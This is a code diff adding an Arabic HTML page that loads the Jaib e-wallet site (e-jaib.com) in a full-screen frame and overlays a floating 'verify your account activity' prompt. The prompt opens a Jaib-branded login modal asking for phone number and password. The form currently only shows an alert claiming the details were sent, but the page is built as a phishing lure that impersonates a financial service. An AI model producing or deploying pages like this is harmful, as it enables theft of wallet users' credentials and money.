@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة مع نافذة منبثقة (زر عائم)</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
+    <style>
+        /* خط مخصص وتصميم أساسي */
+        body, html {
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            background-color: #f4f4f5;
+        }
+
+        /* حاوية الإطار الرئيسي لتأخذ كامل الصفحة */
+        .main-content {
+            height: 100vh; 
+            width: 100%;
+        }
+
+        .main-iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        /* الحاوية العائمة للزر */
+        .floating-container {
+            width: 100%;
+            position: fixed; /* تثبيت الحاوية لتطفو فوق المحتوى */
+            bottom: 1.5rem; /* 24px - المسافة من أسفل الشاشة */
+            left: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 40; /* لضمان ظهوره فوق الإطار الرئيسي */
+        }
+        
+        /* البطاقة التي تحتوي على النص والزر */
+        .verify-card {
+            background-color: #f2f2f2;
+            border-radius: 0.75rem;
+            padding: 1rem;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15); /* زيادة الظل ليعطي إحساس بالطفو */
+        }
+
+    </style>
+</head>
+<body class="antialiased">
+
+    <!-- حاوية المحتوى الرئيسي (بدون تغيير) -->
+    <div class="main-content">
+        <iframe
+            src="https://e-jaib.com/"
+            title="الإطار الرئيسي (e-jaib.com)"
+            class="main-iframe"
+            allowfullscreen
+        >
+            <p>متصفحك لا يدعم الإطارات.</p>
+        </iframe>
+    </div>
+
+    <!-- الحاوية العائمة الجديدة -->
+    <div class="floating-container">
+        <div class="verify-card">
+            <p class="text-red-600 text-lg font-bold mb-3">تحقق من نشاط حسابك</p>
+            <button
+                onclick="openModal()"
+                class="bg-white text-red-600 hover:bg-red-50 font-bold py-2 px-10 rounded-md transition duration-300 ease-in-out border border-red-600"
+            >
+                تحقق
+            </button>
+        </div>
+    </div>
+
+    <!-- نافذة تسجيل الدخول المنبثقة (بدون تغيير) -->
+    <div id="loginModal" class="fixed inset-0 bg-black bg-opacity-70 z-50 hidden justify-center items-center p-4">
+        <div class="bg-white p-0 rounded-2xl shadow-2xl w-full max-w-sm text-center overflow-hidden">
+            <div class="bg-red-600 p-6 flex flex-col items-center justify-center">
+                <div class="bg-white rounded-full p-2 mb-3">
+                    <svg class="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                </div>
+                <h2 class="text-2xl font-extrabold text-white">تسجيل الدخول</h2>
+                <p class="text-white opacity-90 text-sm mt-1">المتابعة إلى حساب جيب</p>
+            </div>
+            <div class="p-6 sm:p-8">
+                <form onsubmit="event.preventDefault(); alert('تم إرسال معلومات تسجيل الدخول.'); closeModal();">
+                    <div class="mb-4">
+                        <input type="tel" id="phone" name="phone" class="w-full p-3 text-right bg-gray-100 border-2 border-gray-200 text-gray-800 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-red-500 transition duration-300" placeholder="رقم الهاتف">
+                    </div>
+                    <div class="mb-6">
+                        <input type="password" id="password" name="password" class="w-full p-3 text-right bg-gray-100 border-2 border-gray-200 text-gray-800 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-red-500 transition duration-300" placeholder="كلمة المرور">
+                    </div>
+                    <button type="submit" class="w-full bg-red-600 text-white font-bold py-3 px-4 rounded-lg hover:bg-red-700 focus:outline-none focus:ring-4 focus:ring-red-300 transition-all duration-300 shadow-md hover:shadow-lg">متابعة</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- دوال التحكم في النافذة المنبثقة (بدون تغيير) ---
+        const loginModal = document.getElementById('loginModal');
+        
+        function openModal() {
+            if (loginModal) {
+                loginModal.classList.remove('hidden');
+                loginModal.classList.add('flex');
+            }
+        }
+
+        function closeModal() {
+            if (loginModal) {
+                loginModal.classList.remove('flex');
+                loginModal.classList.add('hidden');
+            }
+        }
+        
+        loginModal.addEventListener('click', function(event) {
+            if (event.target === loginModal) {
+                closeModal();
+            }
+        });
+        
+        document.addEventListener('keydown', function(event) {
+            if (event.key === "Escape" && !loginModal.classList.contains('hidden')) {
+                closeModal();
+            }
+        });
+    </script>
+</body>
+</html>
